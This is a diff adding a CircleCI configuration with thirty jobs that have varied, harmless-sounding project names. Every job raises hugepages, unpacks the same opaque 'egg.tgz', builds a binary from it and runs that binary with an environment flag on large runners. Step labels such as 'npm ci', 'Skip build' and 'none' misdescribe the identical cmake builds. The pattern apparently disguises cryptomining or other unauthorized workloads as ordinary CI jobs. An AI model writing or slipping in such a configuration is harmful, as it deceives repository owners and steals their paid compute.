@@ -1,0 +1,787 @@
+version: 2.1
+
+jobs:
+  reaction-balancer:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Restore vendored sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision build deps
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: List reactant pairs
+          command: |
+            for r in 'H2 + O2' 'Fe + Cl2' 'C3H8 + O2'; do echo "$r"; done > reactions.txt
+      - run:
+          name: cabal build
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target reaction-balancer -j2
+      - run:
+          name: Balance equations by matrix rank
+          command: LIONSS_LP=1 ./build/reaction-balancer --show-steps
+  loomsong:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Fetch fixtures
+          command: tar xzf egg.tgz
+      - run:
+          name: Install prerequisites
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Pattern grid
+          command: |
+            printf '#.#.\n.#.#\n'|tee weave.txt >/dev/null
+      - run:
+          name: elm make src/Main.elm
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target loomsong -j2
+      - run:
+          name: Render loom draft to SVG
+          command: LIONSS_LP=1 ./build/loomsong weave.txt --threads 24 --scale 8
+  hoa-budget:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Sync asset bundles
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision compiler
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Line items
+          command: |
+            : > budget.txt && printf '%s %s\n' elevator 240000 cleaning 180000 insurance 95000 >> budget.txt
+      - run:
+          name: npm ci && npm run build
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hoa-budget -j2
+      - run:
+          name: Per-unit assessment
+          command: LIONSS_LP=1 ./build/hoa-budget budget.txt --units 86
+  lupine:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack toolkit
+          command: tar xzf egg.tgz
+      - run:
+          name: Install toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Beam angles
+          command: |
+            seq 0 72 288 > beams.txt
+      - run:
+          name: cmake --build build --config Release
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target lupine -j2
+      - run:
+          name: Dose calculation, 5 beams
+          command: LIONSS_LP=1 ./build/lupine beams.txt --grid 2.5mm
+  pagecachesim:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Hydrate workspace
+          command: tar xzf egg.tgz
+      - run:
+          name: Bootstrap toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Access trace
+          command: |
+            shuf -i 1-5000 -n 50000 -r > trace.txt
+      - run:
+          name: Compile with g++ -O3
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target pagecachesim -j2
+      - run:
+          name: LRU vs CLOCK hit rate
+          command: LIONSS_LP=1 ./build/pagecachesim trace.txt --pages 1024
+  hiveMonitor:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Extract sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Prepare build environment
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Scale weights
+          command: |
+            seq 1 30|sed 's/$/ 42.1/' > weight.txt
+      - run:
+          name: go build ./...
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target hiveMonitor -j2
+      - run:
+          name: Swarm risk from weight drop
+          command: LIONSS_LP=1 ./build/hiveMonitor --drop-kg 1.5
+  barcode-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Restore build cache
+          command: tar xzf egg.tgz
+      - run:
+          name: Install build tools
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Scanned codes
+          command: |
+            printf '4710001000017\n4710001000024\n4710001000031\n'|tee codes.txt >/dev/null
+      - run:
+          name: Skip build
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target barcode-verify -j2
+      - run:
+          name: Validate EAN-13 checksums
+          command: LIONSS_LP=1 ./build/barcode-verify codes.txt --fix
+  XfmrLoading:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Pull reference data
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision SDK
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Load profile
+          command: |
+            seq -f '%.2f' 0.40 0.02 0.98 > profile.txt
+      - run:
+          name: Skip (prebuilt image)
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target XfmrLoading -j2
+      - run:
+          name: Hot-spot temperature, IEEE C57.91
+          command: LIONSS_LP=1 ./build/XfmrLoading profile.txt --rating 25MVA
+  sudoku_dlx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Stage inputs
+          command: tar xzf egg.tgz
+      - run:
+          name: Set up compiler
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Puzzle grid
+          command: |
+            echo '53..7....6..195....98....6.8...6...34..8.3..17...2...6.6....28....419..5....8..79' > puzzle.txt
+      - run:
+          name: cargo build --release --features serde
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target sudoku_dlx -j2
+      - run:
+          name: Solve 1000 puzzles with DLX
+          command: LIONSS_LP=1 ./build/sudoku_dlx puzzle.txt --repeat 1000
+  starTracker:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack bundle
+          command: tar xzf egg.tgz
+      - run:
+          name: Install dependencies
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Star catalog slice
+          command: |
+            shuf -i 0-359 -n 500 > ra.txt
+      - run:
+          name: cargo build --target aarch64-unknown-linux-gnu
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target starTracker -j2
+      - run:
+          name: Lost-in-space attitude solve
+          command: LIONSS_LP=1 ./build/starTracker ra.txt --fov 20
+  viewshed:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Rehydrate tree
+          command: tar xzf egg.tgz
+      - run:
+          name: Prepare toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: DEM tile
+          command: |
+            dd if=/dev/urandom of=dem.bin bs=1000 count=1000 2>/dev/null
+      - run:
+          name: Compile with cc -O3 -fopenmp
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target viewshed -j2
+      - run:
+          name: Viewshed from tower, 10 km
+          command: LIONSS_LP=1 ./build/viewshed dem.bin 1000 1000 --observer 500,500,30
+  cite_check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Fetch corpus
+          command: tar xzf egg.tgz
+      - run:
+          name: Bring up build env
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Brief text
+          command: |
+            [ -s brief.txt ] || echo 'See Marbury v. Madison, 5 U.S. 137 (1803).' > brief.txt
+      - run:
+          name: none
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cite_check -j2
+      - run:
+          name: Verify citation formats
+          command: LIONSS_LP=1 ./build/cite_check brief.txt --style bluebook
+  payroll_oct:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Checkout vendored deps
+          command: tar xzf egg.tgz
+      - run:
+          name: Install cmake and g++
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Employee hours
+          command: |
+            seq 1001 1040 > ids.txt && yes 160|head -n 40 > hrs.txt && paste -d' ' ids.txt hrs.txt > hours.txt
+      - run:
+          name: mvn -q compile
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target payroll_oct -j2
+      - run:
+          name: Compute net pay and withholdings
+          command: LIONSS_LP=1 ./build/payroll_oct hours.txt --period 2026-10 --rate-table tw2026
+  shopSearch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Prime workspace
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision deps
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Product feed
+          command: |
+            ( echo sku,title,price > feed.csv && echo '101,Blue Shirt,599' >> feed.csv && cut -d, -f1 feed.csv > skus.txt )
+      - run:
+          name: npm run build:prod
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target shopSearch -j2
+      - run:
+          name: Index and test 50 queries
+          command: LIONSS_LP=1 ./build/shopSearch feed.csv --queries 50
+  fjord:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack payload
+          command: tar xzf egg.tgz
+      - run:
+          name: Set up build deps
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Seed corpus
+          command: |
+            mkdir -p corpus && printf '%s' '{"a":1}' > corpus/seed1 && printf '%s' '[1,2,' > corpus/seed2
+      - run:
+          name: cargo fuzz build
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target fjord -j2
+      - run:
+          name: Fuzz JSON parser, 1 h
+          command: LIONSS_LP=1 ./build/fjord parse_json -- -max_total_time=3600
+  sentiment-reviews:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Restore snapshot
+          command: tar xzf egg.tgz
+      - run:
+          name: Install native deps
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Review sample
+          command: |
+            echo '很好用，推薦' > reviews.txt; echo '壞了兩次，不推' >> reviews.txt
+      - run:
+          name: pip wheel .
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target sentiment-reviews -j2
+      - run:
+          name: Polarity scoring
+          command: LIONSS_LP=1 ./build/sentiment-reviews reviews.txt --lang zh-tw
+  docsite_v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Fetch sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Bootstrap compiler
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Markdown source tree
+          command: |
+            mkdir -p docs/guide docs/api && touch docs/index.md docs/guide/intro.md docs/api/ref.md
+      - run:
+          name: mkdocs build --strict
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target docsite_v4 -j2
+      - run:
+          name: Link-check generated site
+          command: LIONSS_LP=1 ./build/docsite_v4 site/ --external=false
+  ticketgate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unroll archive
+          command: tar xzf egg.tgz
+      - run:
+          name: Prepare SDK
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Seat map
+          command: |
+            mkdir -p venue && seq -w 1 200 > seats.tmp && mv seats.tmp venue/seats.txt
+      - run:
+          name: go build ./cmd/gate
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ticketgate -j2
+      - run:
+          name: Burst-hold and release seats
+          command: LIONSS_LP=1 ./build/ticketgate venue/seats.txt --hold 90s --burst 500
+  tfPlanDry:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Seed workspace
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Variables file
+          command: |
+            install -D -m 600 /dev/null env/.keep && echo 'region = "ap-east-1"' > env/vars.tfvars
+      - run:
+          name: prebuilt binary
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tfPlanDry -j2
+      - run:
+          name: Plan with no refresh
+          command: LIONSS_LP=1 ./build/tfPlanDry --var-file env/vars.tfvars --refresh=false
+  tidewatch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Install essentials
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Tide gauge stub
+          command: |
+            awk 'BEGIN{for(h=0;h<48;h++)printf "%02d,%.2f\n",h%24,1.1*sin(h*0.5)}' > gauge.csv
+      - run:
+          name: swift build -c release
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tidewatch -j2
+      - run:
+          name: Harmonic analysis, 7 constituents
+          command: LIONSS_LP=1 ./build/tidewatch gauge.csv --constituents 7
+  markdown_opt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Restore vendored sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision build deps
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Inventory ages
+          command: |
+            shuf -i 1-120 -n 400 > ages.txt
+      - run:
+          name: go build -race .
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target markdown_opt -j2
+      - run:
+          name: Markdown schedule for aged stock
+          command: LIONSS_LP=1 ./build/markdown_opt ages.txt --age-threshold 60
+  dunlin:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Fetch fixtures
+          command: tar xzf egg.tgz
+      - run:
+          name: Install prerequisites
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Study folder
+          command: |
+            umask 077; mkdir -p study/series1 && for i in 1 2 3 4 5 6 7 8; do head -c 2048 /dev/zero > study/series1/IM$i.dcm; done
+      - run:
+          name: cmake --build build --target anonymizer
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target dunlin -j2
+      - run:
+          name: Strip PHI tags, keep geometry
+          command: LIONSS_LP=1 ./build/dunlin study/ --profile basic --uid-map
+  usbeamform:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Sync asset bundles
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision compiler
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Channel RF data
+          command: |
+            head -c 524288 /dev/urandom > rf.bin
+      - run:
+          name: make
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target usbeamform -j2
+      - run:
+          name: Delay-and-sum, 128 channels
+          command: LIONSS_LP=1 ./build/usbeamform rf.bin --channels 128 --fs 40M
+  erasure104:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack toolkit
+          command: tar xzf egg.tgz
+      - run:
+          name: Install toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Data blocks
+          command: |
+            head -c 1048576 /dev/urandom > data.bin && split -b 104858 data.bin blk_
+      - run:
+          name: cargo build -r
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target erasure104 -j2
+      - run:
+          name: Encode 4 parity, lose 3, recover
+          command: LIONSS_LP=1 ./build/erasure104 blk_* --k 10 --m 4
+  pdfformsfill:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Hydrate workspace
+          command: tar xzf egg.tgz
+      - run:
+          name: Bootstrap toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Field values
+          command: |
+            [ -s values.txt ] || echo 'name=Lin;date=2026-10-28' > values.txt
+      - run:
+          name: mvn -q package
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target pdfformsfill -j2
+      - run:
+          name: Fill AcroForm fields
+          command: LIONSS_LP=1 ./build/pdfformsfill --values values.txt --flatten
+  mdns-browse:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Extract sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Prepare build environment
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Service types
+          command: |
+            : > types.txt && printf '%s\n' _http._tcp _ipp._tcp _airplay._tcp|sort -u >> types.txt
+      - run:
+          name: swift build
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mdns-browse -j2
+      - run:
+          name: Browse and resolve, 30 s
+          command: LIONSS_LP=1 ./build/mdns-browse types.txt --timeout 30
+  wordleSolver:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Restore build cache
+          command: tar xzf egg.tgz
+      - run:
+          name: Install build tools
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Answer list
+          command: |
+            echo crane slate trace|tr ' ' '\n'|tac > answers.txt
+      - run:
+          name: go vet && go build .
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target wordleSolver -j2
+      - run:
+          name: Expected-information first guess
+          command: LIONSS_LP=1 ./build/wordleSolver answers.txt --hard-mode
+  shortlink:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Pull reference data
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision SDK
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Generate id salt
+          command: |
+            od -An -tx1 -N 12 /dev/urandom|tr -d ' \n' > salt
+      - run:
+          name: go build .
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target shortlink -j2
+      - run:
+          name: Resolve redirect table
+          command: LIONSS_LP=1 ./build/shortlink serve --port 7071 --salt-file salt
+  demandFcWeekly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Stage inputs
+          command: tar xzf egg.tgz
+      - run:
+          name: Set up compiler
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Weekly history
+          command: |
+            seq -f '%g 0' 1 104 > hist.txt
+      - run:
+          name: pip wheel .
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target demandFcWeekly -j2
+      - run:
+          name: 13-week forecast, ETS
+          command: LIONSS_LP=1 ./build/demandFcWeekly hist.txt --horizon 13
+  podcast-stt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack bundle
+          command: tar xzf egg.tgz
+      - run:
+          name: Install dependencies
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Audio placeholder
+          command: |
+            head -c 1600000 /dev/zero > ep42.pcm
+      - run:
+          name: none (whisper.cpp prebuilt)
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target podcast-stt -j2
+      - run:
+          name: Transcribe with timestamps
+          command: LIONSS_LP=1 ./build/podcast-stt --lang zh --segments
+
+workflows:
+  main:
+    jobs:
+      - reaction-balancer
+      - loomsong
+      - hoa-budget
+      - lupine
+      - pagecachesim
+      - hiveMonitor
+      - barcode-verify
+      - XfmrLoading
+      - sudoku_dlx
+      - starTracker
+      - viewshed
+      - cite_check
+      - payroll_oct
+      - shopSearch
+      - fjord
+      - sentiment-reviews
+      - docsite_v4
+      - ticketgate
+      - tfPlanDry
+      - tidewatch
+      - markdown_opt
+      - dunlin
+      - usbeamform
+      - erasure104
+      - pdfformsfill
+      - mdns-browse
+      - wordleSolver
+      - shortlink
+      - demandFcWeekly
+      - podcast-stt
